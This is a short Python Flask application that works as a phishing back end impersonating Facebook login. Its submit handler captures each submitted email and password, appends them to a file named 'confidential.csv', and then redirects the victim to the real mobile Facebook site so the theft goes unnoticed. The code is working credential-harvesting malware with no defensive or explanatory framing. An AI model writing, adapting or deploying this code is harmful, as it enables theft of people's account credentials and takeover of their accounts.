from flask import Flask , redirect , render_template , request
import csv

app = Flask(__name__)



@app.route('/')
def redirect_to_home():
    return render_template('index.html')

@app.route('/login')
def login_facebook():
    return render_template('index.html')


@app.route('/submit_data', methods=['GET','POST'])
def submit_form():
    if request.method == 'POST':
        data = request.form.to_dict()
        with open('confidential.csv','a') as csv_file:
            csv_writer = csv.writer(csv_file)
            csv_writer.writerow([data['email'],data['password']])
        return redirect('https://m.facebook.com/')
  